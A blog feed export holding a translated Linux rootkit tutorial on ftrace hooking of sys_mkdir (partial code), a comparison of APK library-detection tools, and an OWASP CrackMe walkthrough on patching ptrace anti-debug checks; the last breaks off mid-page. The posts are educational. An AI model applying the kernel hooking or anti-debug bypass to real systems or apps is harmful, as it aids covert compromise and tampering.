Tracing的内容，里面也提及到了Ftrace、kprobes、eBFP和tracepoints这些用于hook内核函数的方法，感兴趣的可以看看)。具体点说，我们可以在任何时候让ftrace单步执行<code>rip</code>寄存器中包含的一个具体的内存地址。如果我们设的是<code>sys_mkdir</code>系统调用函数的地址，利用ftrace我们可以用另外一个函数替换<code>sys_mkdir</code>运行。</p><p>Ftrace所有需要掌握的信息，实际上就是封装到<code>ftrace_hook</code>结构体中的内容。由于我们想要实现一次性hook多个函数，所以在代码中就使用了<code>hooks[]</code>数组。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">static struct ftrace_hook hooks[] = &#123;</span><br><span class="line">    HOOK(&quot;sys_mkdir&quot;, hook_mkdir, &amp;orig_mkdir),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p><code>hooks[]</code>数组有一点需要拆开来讲的，首先，我们来看看<a href="https://gist.github.com/xcellerator/ac2c039a6bbd7782106218298f5e5ac1#file-ftrace_helper-h" target="_blank" rel="noopener"><code>ftrace_helper.h</code></a>源码中的<code>ftrace_hook</code>结构体。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ftrace_hook</span> &#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">void</span> *function;</span><br><span class="line">    <span class="keyword">void</span> *original;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> address;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ftrace_ops</span> <span class="title">ops</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>利用<code>HOOK</code>宏，能够更加简单快速地给结构体赋值：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HOOK(_name, _hook, _orig) \</span></span><br><span class="line">&#123; \</span><br><span class="line">    .name = SYSCALL_NAME(_name), \</span><br><span class="line">    .function = (_hook), \</span><br><span class="line">    .original = (_orig), \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>使用到<code>SYSCALL_NAME</code>宏是因为考虑到在64位的Linux内核中，系统调用函数在他们的函数名称前会带有<code>__64_</code>的前缀。</p></blockquote><p>结构体的部分介绍起来挺简单的，现在我们该看看<code>fh_install_hooks()</code>函数了，该函数是实现hook功能重要的一环。骗你的，我只是利用这种方式来提醒你们，<code>fh_install_hooks()</code>仅仅利用循环实现了<code>hooks[]</code>数组遍历以及为数组中每个内核函数调用<code>fh_install_hook()</code>函数。</p><p><code>fh_install_hook()</code>函数中第一步就是调用<code>fh_resolve_hook_address()</code>，并给该函数传递一个作为参数的<code>ftrace_hook</code>对象。<code>fh_install_hook()</code>函数用了<code>&lt;linux/kallsyms.h&gt;</code>头文件提供的<code>kallsyms_lookup_name()</code>函数获取原本系统调用函数加载到内存中的地址，比如在我们想要的应用场景中就是获取<code>sys_mkdir</code>系统调用函数的内存加载地址。获取内存地址的这个步骤很重要，考虑到<code>orig_mkdir()</code>函数需要分配系统调用函数的内存加载地址，以及我们编写的rookit内核模块在重加载的时候需要恢复运行环境，所以保存获取的内存地址是很有必要的。源码中，将获取的系统调用函数加载地址保存在<code>ftrace_hook</code>结构体中的<code>.address</code>字段中。</p><p>下面，来看看<a href="https://gist.github.com/xcellerator/ac2c039a6bbd7782106218298f5e5ac1#file-ftrace_helper-h" target="_blank" rel="noopener"><code>ftrace_helper.h</code></a>源码中略显诡异的预处理声明：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#if USE_FENTRY_OFFSET</span><br><span class="line">    *((unsigned long*) hook-&gt;original) = hook-&gt;address + MCOUNT_INSN_SIZE;</span><br><span class="line">#else</span><br><span class="line">    *((unsigned long*) hook-&gt;original) = hook-&gt;address;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure></p><p>想要理解上面的声明，需要先想到在我们尝试hook函数的时候使用递归可能会面临的风险。主要有两种思路可以避免这个风险，第一种是利用函数返回的地址监测递归，第二种就直接用上面的<code>+ MCOUNT_INSN_SIZE</code>跳过ftrace的调用(在Linux内核的源码中，<a href="https://www.kernel.org/doc/Documentation/trace/ftrace-design.txt" target="_blank" rel="noopener"><code>MCOUNT_INSN_SIZE</code></a>表示着<code>mcount()</code>函数总体的大小，而<code>mcount()</code>函数又会用<code>ftrace_caller()</code>调用ftrace，所以在hook地址上加上<code>MCOUNT_INSN_SIZE</code>就能跳过ftrace的调用，从而避免Ftrace在hook函数调用<code>orig_mkdir</code>后又再次调用该函数，让递归陷入死循环的情况)。通过判断<code>USE_FENTRY_OFFSET</code>的值，源码选择不同的方式避免递归死循环。当<code>USE_FENTRY_OFFSET</code>的值为0的时候，使用用返回地址监测递归的方法，为1的时候用第二种方法。</p><p>如果想使用第一种方式监测递归，那就需要关闭ftrace提供的保护机制（ftrace会恢复现场，也就是恢复rip寄存器的值，因此调用了ftrace之后会无止境地递归hook函数）。ftrace内置的保护机制需要利用保存在<code>rip</code>中函数返回地址，不过如果我们仍旧要用<code>rip</code>的话，还是需要有保护机制的，因此最后需要用我们自己的保护机制替换掉ftrace内置的保护机制。这些可以利用<code>ftrace_hook</code>结构体中的<code>.original</code>字段实现，<code>.original</code>字段存着<code>.name</code>字段对应的系统调用函数的内存地址。</p><p>下一个介绍<code>fh_install_hook()</code>的就是<code>ftrace_hook</code>结构体的<code>.ops</code>字段，该字段自己本身就是一个带有两个字段的结构体。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hook-&gt;ops.func = fh_ftrace_thunk;</span><br><span class="line">hook-&gt;ops.flags = FTRACE_OPS_FL_SAVE_REGS</span><br><span class="line">                | FTRACE_OPS_FL_RECURSION_SAFE</span><br><span class="line">                | FTRACE_OPS_FL_IPMODIFY;</span><br></pre></td></tr></table></figure></p><h1 id="3-参考文章"><a href="#3-参考文章" class="headerlink" title="3 参考文章"></a>3 参考文章</h1><ul><li><a href="https://www.fireeye.com/blog/threat-research/2018/04/loading-kernel-shellcode.html" target="_blank" rel="noopener">Loading Kernel Shellcode</a></li><li><a href="https://www.exploit-db.com/docs/english/21013-shellcoding-in-linux.pdf" target="_blank" rel="noopener">Shellcoding in Linux</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1 前言&quot;&gt;&lt;/a&gt;1 前言&lt;/h1&gt;&lt;p&gt;本篇文章翻译自&lt;a href=&quot;https://xcellerator.github.io/posts/linux_root
      
    
    </summary>
    
    
      <category term="Linux Rookit 翻译" scheme="http://Se8S0n.github.io.git/tags/Linux-Rookit-%E7%BF%BB%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>获取APK中第三方库信息的工具</title>
    <link href="http://Se8S0n.github.io.git/2020/01/29/%E8%8E%B7%E5%8F%96APK%E4%B8%AD%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93%E4%BF%A1%E6%81%AF%E7%9A%84%E5%B7%A5%E5%85%B7/"/>
    <id>http://Se8S0n.github.io.git/2020/01/29/获取APK中第三方库信息的工具/</id>
    <published>2020-01-29T20:04:02.000Z</published>
    <updated>2021-08-05T06:51:27.411Z</updated>
    
    <content type="html"><![CDATA[<h2 id="获取APK中第三方库信息的工具"><a href="#获取APK中第三方库信息的工具" class="headerlink" title="获取APK中第三方库信息的工具"></a>获取APK中第三方库信息的工具</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近想尝试开发一个Android安全性检测平台，在尝试获取APK第三方SDK的信息的时候出现了一些问题，直接使用androguard是不能获取SDK的信息的，且现在第三方提供的SDK大多都经过了混淆或者重命名处理等保护SDK安全性的方法，就造成了我们很难准确地获取APK中存在哪些SDK。这时候就需要另(yong)辟(xian)蹊(cheng)径(de)，在网上能够收集到的只有16年北大的<a href="https://github.com/pkumza/LibRadar" target="_blank" rel="noopener">LibRadar</a>、reddr开源的<a href="https://github.com/reddr/LibScout" target="_blank" rel="noopener">LibScout</a>和基于LibScout开发的<a href="https://github.com/regNec/apkLibDetect" target="_blank" rel="noopener">apkLibDetect</a>。</p><h3 id="工具的分析"><a href="#工具的分析" class="headerlink" title="工具的分析"></a>工具的分析</h3><h4 id="LibRadar"><a href="#LibRadar" class="headerlink" title="LibRadar"></a>LibRadar</h4><p>为了避免手动做很多重复性的信息收集工作，我决定尝试使用多个工具。提取我所需的信息，现在想得到个SDK信息都需要了解机器学习，是我太菜了。下面我大概地讲讲LibRadar这个工具，详情可看<a href="http://sei.pku.edu.cn/~yaoguo/papers/Wang-JOS-17.pdf" target="_blank" rel="noopener">LibRadar的相关论文</a>。</p><p>LibRadar使用了多级聚类技术识别第三方库（因为第三方库调用的次数多，再加上第三方库一般不会修改，根据这两个特点判断是否为第三方库），使用机器学习对第三方库的功能进行准确分类（应该是使用了分类算法）。但是这个工具不能实现我想判断这个第三方库安全与否的功能，且因工具年代久远，团队不再对该工具进行维护。不过要是能将这个工具在python3的环境下修改和调试，应该能减少获取第三方SDK的工作量，且避免了在python更新之后不能正常使用的情况。但是我还没有研究过，这只能作为一个可行的方案之一。</p><p>搭建环境</p><ul><li>Ubuntu 18.04</li><li>Python 2.7.6</li></ul><p>下面就先在Ubuntu上搭建好Python2的使用环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 准备好编译Python的环境</span><br><span class="line">$ sudo apt-get install zlib1g-dev</span><br><span class="line">$ sudo apt-get install gcc</span><br><span class="line"># 获取Python 2.7.6的安装包</span><br><span class="line">$ wget http://www.python.org/ftp/python/2.7.6/Python-2.7.6.tar.xz</span><br><span class="line">$ tar xvf Python-2.7.6.tar.xz</span><br><span class="line">$ cd Python-2.7.6</span><br><span class="line">$ ./configure</span><br><span class="line"># 编译、安装</span><br><span class="line">$ make &amp; make install</span><br></pre></td></tr></table></figure></p><p>接下来就准备好LibRadar的使用环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 下载LiteRadar</span><br><span class="line">$ git clone https://github.com/pkumza/LiteRadar</span><br><span class="line"># 下载SDK特征文件</span><br><span class="line">$ wget https://raw.githubusercontent.com/pkumza/Data_for_LibRadar/master/lite_dataset_10.csv</span><br><span class="line">$ mv lite_dataset_10.csv LiteRadar/LiteRadar/Data</span><br><span class="line"># 获取aaa.apk中的第三方SDK信息</span><br><span class="line">$ python LiteRadar/LiteRadar/literadar.py aaa.apk</span><br></pre></td></tr></table></figure></p><p>获取到的结果如下：<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1580271030/1_hoyghp.png" alt></p><p>但是处理multi-dex的APK会出现如下报错：<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1580271047/2_l1icpk.png" alt></p><p>但是换了内存2048MB的VPS就能正常解决，而且显示的结果与LibScout比起来感觉更加符合我们的基础需求：<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1580271055/3_melokb.png" alt></p><h4 id="LibScout"><a href="#LibScout" class="headerlink" title="LibScout"></a>LibScout</h4><p>因为apkLibDetect是基于LibScout的，所以就不另外分出模块讲解apkLibDetect了。在操作过程中如果遇到了问题，可以参考文章的末尾，有我遇到的问题及其处理方式。</p><p>搭建环境</p><ul><li>Ubuntu 18.04</li><li>openjdk 11.0.5</li><li>Android Studio</li></ul><p>这里先提供了自己编译LibScout.jar的方法，如果不想自己编译LibScout.jar文件，可以直接用<code>apt install libscout</code>，详细的介绍后面有。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 下载LibScout</span><br><span class="line">$ git clone https://github.com/reddr/LibScout.git</span><br><span class="line"># 下载SDK检测的样本文件</span><br><span class="line">$ git clone https://github.com/reddr/LibScout-Profiles.git</span><br><span class="line">$ cd LibScout</span><br><span class="line"># 生成LibScout.jar</span><br><span class="line">$ ./gradlew build</span><br></pre></td></tr></table></figure></p><p><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1580271068/4_scgq22.png" alt></p><p>除了我们自己编译之外，我们还可以使用<code>apt</code>直接安装libscout的方式使用LibScout。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ apt update &amp;&amp; apt upgrade</span><br><span class="line">$ apt install libscout</span><br></pre></td></tr></table></figure></p><p>在下好Android Studio环境下找到<code>Android/Sdk/platforms/android-28</code>目录下的<code>android.jar</code>文件，并在LibScout目录下新建sdk文件夹，将<code>android.jar</code>文件放到该目录下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir sdk</span><br><span class="line">$ mv [path of android.jar]/android.jar sdk/android.jar</span><br><span class="line">$ cd ..</span><br><span class="line"># 使用自己编译的LibScout.jar获取第三方SDK信息</span><br><span class="line">$ java -jar ./LibScout/build/libs/LibScout.jar -o match -p ./LibScout-Profiles -c ./LibScout/config/LibScout.toml -a ./LibScout/sdk/android-28.jar aaa.apk</span><br><span class="line"># 使用apt安装的libscout获取第三方SDK信息并输出到LibScout/result目录下</span><br><span class="line">$ libscout -o match -p ./LibScout-Profiles -c ./LibScout/config/LibScout.toml -j ./LibScout/result -a ./LibScout/sdk/android-28.jar test22.apk</span><br></pre></td></tr></table></figure></p><p>执行命令获取SDK信息，并直接输出到屏幕。-o参数指定相关操作，match是获取该APK中存在的SDK信息，-p参数指向我们之前下载的第三方SDK检测的样本文件，-a参数指向我们之前获取的<code>android.jar</code>，这个参数能将SDK与APK区分开来。如果有其它需求，比如将检测结果输入为json文件，可以添加一个-j参数指定输出结果存放的目录。</p><p>根据应用的包名，进入<code>./LibScout/result/cn/ninegame/gamemanager</code>目录下，会发现有一个json文件，该文件储存了第三方SDK信息。下面是格式化过的json文件：<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1580271072/5_x8k8rj.png" alt></p><p>在LibScout平级路径下获取SDK信息出现报错，报错如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">03:59:32.160 [main] ERROR de.infsec.tpl.TplCLI - Error: Could not parse config option logging.log4j_config_file : No valid file: ~/LibScout/config/logback.xml</span><br></pre></td></tr></table></figure></p><p>上面的报错修改了LibScout.toml中logback.xml的路径为./LibScout/config/logback.xml就不会报错了。</p><p>在获取SDK信息的过程中遇到了运行Java代码时堆空间过小的报错：<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1580271263/6_e2d7om.png" alt><br>上面的报错同样是可以通过换大内存的VPS或增加虚拟机的内存解决。</p><p>其实LibScout也是存在着不足的，但是它有一个优点就是当遇到multi-dex的APK的时候，它会将多个dex文件整合到一起，再进行检测。同时LibScout还能结合工具判断第三方库是否足够安全，当然这个安全与否是基于是否有漏洞爆出和第三方库的版本的。LibScout的不足还有两个，一是是它需要的内存过大，二是LibScout能检测的SDK虽然能包含大部分，但是还是存在一些第三方SDK检测不出来的情况。</p><h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><p>比较一下LibRadar和LibScout，会感觉如果不考虑获取第三方库的安全性和检测第三方库的工具的可维护性，LibRadar会更加符合我的需求。但是要考虑到第三方库安全与否，与检测结果是否可延展，可延展指的是可以通过检测结果结合现有的漏洞库信息获取更多我们需要的信息，还是使用LibScout更加合适。</p><p>如果文章中有表述的不够合适的或者有更好的获取第三方库的方法，希望能够交流一下。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;获取APK中第三方库信息的工具&quot;&gt;&lt;a href=&quot;#获取APK中第三方库信息的工具&quot; class=&quot;headerlink&quot; title=&quot;获取APK中第三方库信息的工具&quot;&gt;&lt;/a&gt;获取APK中第三方库信息的工具&lt;/h2&gt;&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
    
      <category term="Android" scheme="http://Se8S0n.github.io.git/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>从OWASP CrackMe学Android逆向(二)</title>
    <link href="http://Se8S0n.github.io.git/2019/11/05/%E4%BB%8EOWASP-CrackMe%E5%AD%A6Android%E9%80%86%E5%90%91-%E4%BA%8C/"/>
    <id>http://Se8S0n.github.io.git/2019/11/05/从OWASP-CrackMe学Android逆向-二/</id>
    <published>2019-11-06T00:42:48.000Z</published>
    <updated>2021-08-05T06:51:27.379Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>从<a href="https://www.52pojie.cn/thread-1048786-1-1.html" target="_blank" rel="noopener">OWASP CrackMe学Android逆向(一)</a>感觉用题目来学习会比之前学得内容多很多, 然后这些题目有多种解法, 我也学到很多姿势, 下面就来分析<code>UnCrackable-Level2</code>。这个题目涉及.so动态调试的知识。</p><h2 id="UnCrackable-Level2"><a href="#UnCrackable-Level2" class="headerlink" title="UnCrackable-Level2"></a>UnCrackable-Level2</h2><p>同样的, 先将<code>UnCrackable-Level2.apk</code>放到JEB中分析, 一进到MainActivity, 就发现了一个神奇的东西, 这个应用加载了<code>libfoo.so</code>文件。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920916/OWASP/OWASP-2/1.png" alt></p><p>能感觉出来这个应用和之前level1不同的是, check输入的关键代码应该是在<code>libfoo.so</code>中, 所以不能使用Xposed去处理这个CrackMe了, 但是root和debug的检测还是Java层调用<code>System.exit(0)</code>退出。所以上次的cracker.js, 重载系统exit函数部分保留。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920917/OWASP/OWASP-2/2.png" alt></p><p>将<code>UnCrackable-Level2.apk</code>解压之后在<code>UnCrackable-Level2\lib\arm64-v8a</code>目录下找到<code>ibfoo.so</code>, 把它拖到IDA里面分析一下。查看Export表导出的函数, 发现存在含有关键词CodeCheck的函数。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920917/OWASP/OWASP-2/3.png" alt></p><p>按下F5查看其反编译的代码, 发现存在可疑的数据<code>xmmword_EA0</code>。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920917/OWASP/OWASP-2/4.png" alt></p><p> 双击<code>xmmword_EA0</code>, 发现了一个传入v7的是一个大数, 使用Hex-View查看其Ascii码, 发现了一句不完整的话<code>Thank for all t</code><br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920918/OWASP/OWASP-2/5.png" alt><br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920918/OWASP/OWASP-2/6.png" alt></p><p> CheckCode中还有v8参数, 虽然现在暂时不知道它有什么用, 还是先将它最后处理的过程写出来, 详情可以看注释, 最后我们知道v8的数据转换为ascii码之后为”eish”, 暂时不知道这个的用处, 所以先放着。根据下面的result获取, 我们也就知道了, 我们最终想要的字符串是存放在v6参数中的。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920918/OWASP/OWASP-2/7.png" alt></p><p> 分析<code>libfoo.so</code>中的其他的函数, 发现应用限制了attach, 还是通过轮询的方法监视应用是否被调试。也就是说, 如果想使用IDA动态调试这个应用的话, 还需要我们绕过这种反调试的机制。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920918/OWASP/OWASP-2/8.png" alt></p><p> 事先说明，上面静态分析的过程都是对<code>lib\arm64-v8a</code>文件夹下的<code>libfoo.so</code>文件进行分析的。在分析代码的过程中，存在一些函数调用的过程让我们看起来不是很舒服。实际上这些调用的函数都是JNI函数, 我们可以通过导入jni.h文件(File-&gt;Load File-&gt;Parse C header file…)——jni.h文件一般安装了Android Studio都有, 我的存放在<code>Android Studio\jre\include</code>目录下, 选中v4指针，选中后按一下”y”键，然后将类型声明为<code>JNIEnv*</code>即可。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572922697/OWASP/OWASP-2/re_8.png" alt></p><p> 修改之后效果如下：<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920919/OWASP/OWASP-2/9.png" alt></p><p> 那什么时候我们可以使用上面的方法还原函数名呢？在文章<a href="https://wooyun.js.org/drops/%E5%AE%89%E5%8D%93%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E4%B8%83%E7%A7%8D%E6%AD%A6%E5%99%A8%E4%B9%8B%E5%AD%94%E9%9B%80%E7%BF%8E%20%E2%80%93%20Ida%20Pro.html" target="_blank" rel="noopener">安卓动态调试七种武器之孔雀翎 – Ida Pro</a>中有提及, 如果出现一个指针加上一个数字，比如v3+676。然后将这个地址作为一个方法指针进行方法调用，并且第一个参数就是指针自己，比如(v3+676)(v3…)。这实际上就是我们在JNI里经常用到的JNIEnv方法。</p><p> 静态分析就分析到这里了。现在, 我们需要开始动手了。</p><h3 id="静态分析代码"><a href="#静态分析代码" class="headerlink" title="静态分析代码"></a>静态分析代码</h3><p>因为我手机arm版本为<code>arm64-v8a</code>(使用命令<code>adb shell getprop ro.product.cpu.abi</code>可查看arm版本), 所以前面的分析都是基于<code>lib\armeabi-v7a\libfoo.so</code>。当我将<code>lib\armeabi-v7a\libfoo.so</code>拖到32位的IDA中分析代码的时候找到含有<code>CodeCheck</code>的函数, 发现密钥以明文字符串的形式出现了。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920919/OWASP/OWASP-2/10.png" alt></p><p> 这时候我们输入”Thanks for all the fish”, 发现我们成功找到密钥。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920920/OWASP/OWASP-2/11.png" alt></p><p>即便如此简单, 我们还是需要学习通过动态调试的方法获取密钥。以防遇到加了密或者其他更难分析的情况，我们无从下手。</p><h3 id="IDA动态调试代码"><a href="#IDA动态调试代码" class="headerlink" title="IDA动态调试代码"></a>IDA动态调试代码</h3><h4 id="绕过反调试机制"><a href="#绕过反调试机制" class="headerlink" title="绕过反调试机制"></a>绕过反调试机制</h4><p>通过上面的分析(不包含静态分析<code>arm64-v7a</code>目录的libfoo.so文件的内容), 静态分析到现在也没找到完整的23个字母长度的密钥, 我们要通过IDA调试的方法获得密钥,。尝试动态调试.so文件的时候会发现应用会闪退, 所以我们需要来过反调试机制才能让应用正常运行并且获得密钥。那我们怎么做才能成功绕过反调试机制呢？</p><p>根据分析，我们要绕过的反调试机制分别处于Java层和Native层。</p><p>我们下面先修改应用的smali源码, 不然我们设置完AndroidManifest.xml文件<code>debuggable=&quot;true&quot;</code>之后, 还要面对下面的弹窗。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920920/OWASP/OWASP-2/12.png" alt></p><p>还记得我们最开始分析的Java层的代码不, 现在我们来回忆一下。发现应用在root环境或可调试的环境下运行之后, 会调用MainActivity类中的a函数。双击该函数, 分析代码逻辑。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920920/OWASP/OWASP-2/13.png" alt></p><p>发现这个函数会在我们做了点击OK的操作之后调用系统的exit函数退出。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920920/OWASP/OWASP-2/14.png" alt></p><p>反编译apk之后, 定位到刚刚的a函数。发现函数最后返回为return-void, 那我们直接把中间的代码删除就ok。接下来就是常规的反编译+重签名的操作, 这里就不赘述了。安装修改之后的应用, Java层的反调试就绕过了。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920920/OWASP/OWASP-2/15.png" alt><br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920921/OWASP/OWASP-2/16.png" alt></p><p>下面讲一下稍有难度的绕过Native层的代码, 用IDA反编译libfoo.so。从IDA左侧的Function窗口双击<code>Java_sg_vantagepoint_uncrackable2_MainActivity_init</code>, 发现会调用<code>sub_918</code>方法。双击<code>sub_918</code>函数分析代码。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920921/OWASP/OWASP-2/17.png" alt></p><p>通过代码我们可以知道, <code>sub_918</code>是起反调试作用的关键函数。接下来我们分析一下这个函数是如何实现反调试的，该函数会先fork自身, 产生一个子进程, 父进程在运行的过程中使用了轮询机制, 通过<a href="https://refspecs.linuxbase.org/LSB_5.0.0/LSB-Core-generic/LSB-Core-generic/baselib-ptrace-1.html" target="_blank" rel="noopener">ptrace函数</a>监视自身是否处于被调试的状态。子进程和fock失败的父进程, 会调用waitpid一般情况下, ptrace这种类型的函数是不会被混淆的, 所以我们直接将调用ptrace函数的部分nop掉就好了。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920921/OWASP/OWASP-2/18.png" alt></p><p>使用IDA View-A打开<code>sub_918</code>函数, 可以看到有两个<code>BL .ptrace</code>。选中其中的一个<code>.ptrace</code>, 然后打开Hex View-1页面。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920921/OWASP/OWASP-2/19.png" alt><br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920921/OWASP/OWASP-2/20.png" alt></p><p>按下快捷键<code>F2</code>, 输入<code>1F 20 03 D5</code>(NOP), 将原本的<code>9C FF FF 97</code>替换掉, patch结束之后按<code>F2</code>完成修改(两个<code>BL .ptrace</code>都用这种方法修改)。发现网上有部分文章使用指令<code>00 00 00 00</code>和<code>00 00 A0 E1</code>(mov r0,r0)修改, 我按照那种方式修改之后, 发现代码结构被破坏掉了, 应用不能正常运行, 最后直接使用<code>NOP</code>指令才能让应用正常运行, 并绕过反调试的检测。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920922/OWASP/OWASP-2/21.png" alt><br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920922/OWASP/OWASP-2/22.png" alt></p><p>最后按下图选中下图<code>Apply patches to input file....</code>, 就可以保存我们修改之后的结果。我们只需要patch我们设备使用到的<code>libfoo.so</code>文件, 比如我设备的arm版本是<code>arm64-v8a</code>。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920922/OWASP/OWASP-2/23.png" alt></p><p>这里只针对这个应用的反调试作了介绍, 如果想了解更多反调试和绕过反调试的内容, 可以看看文章<a href="https://bbs.pediy.com/thread-223460.htm" target="_blank" rel="noopener">【SO壳】17种安卓native反调试收集</a>。</p><h4 id="IDA动态调试Native代码"><a href="#IDA动态调试Native代码" class="headerlink" title="IDA动态调试Native代码"></a>IDA动态调试Native代码</h4><p>在正式开始之前, 我们需要做点准备工作。 首先打开目录<code>&lt;你IDA安装的目录下&gt;\IDA\dbgsrv</code>, 将该目录下的<code>android_server</code>push进手机里面并添加权限。</p><pre><code>$ adb push android_server64 #要按照你自己的使用的设备的内核进行选择, 查看arm版本就知道$ adb forward tcp:23946 tcp:23946 # 设置本地端口转发$ adb shell$ su$ cd /data/local/tmp$ chmod +x android_server64$ ./android_server</code></pre><p> 经过测试，发现应用不能进行调试。我们先解决AndroidManifest.xml上的反调试，有4种方法：</p><ul><li>反编译APK, 修改AndroidManifest.xml, 使<code>debuggable=&quot;true&quot;</code></li><li>从手机内核中提取出boot.img并修改, 使<code>ro.debuggable=1</code>, 或者可以使用mprop, 但是有版本限制。</li><li>在装有Xposed的手机上安装<a href="https://security.tencent.com/index.php/opensource/detail/17" target="_blank" rel="noopener">BDOpener</a>, 重启激活该模块即可。</li><li><p>设置全局变量, 使<code>ro.debuggable=1</code>（每次开机重启后失效）</p><p>使用上面的方法让应用处于可调试的状态, 用DDMS打开, 效果如下：<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920922/OWASP/OWASP-2/24.png" alt></p></li></ul><p>先输入命令<code>adb shell dumpsys activity top | findstr ACTIVITY</code>, 通过输出可知应用的包名及当前的Activity, 输入命令<code>adb shell am start -D -n owasp.mstg.uncrackable2/sg.vantagepoint.uncrackable2.MainActivity</code>可让Uncrackable2这个应用处于被调试状态。这时候查看DDMS, 我们可以看到应用的状态改变了。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920922/OWASP/OWASP-2/25.png" alt></p><p> 接下来要用IDA对<code>.so</code>文件进行动态调试, 打开64位的IDA，打开debug选项<code>Debugger-&gt;attach-&gt;Remoute Android debugger</code>。<br><img 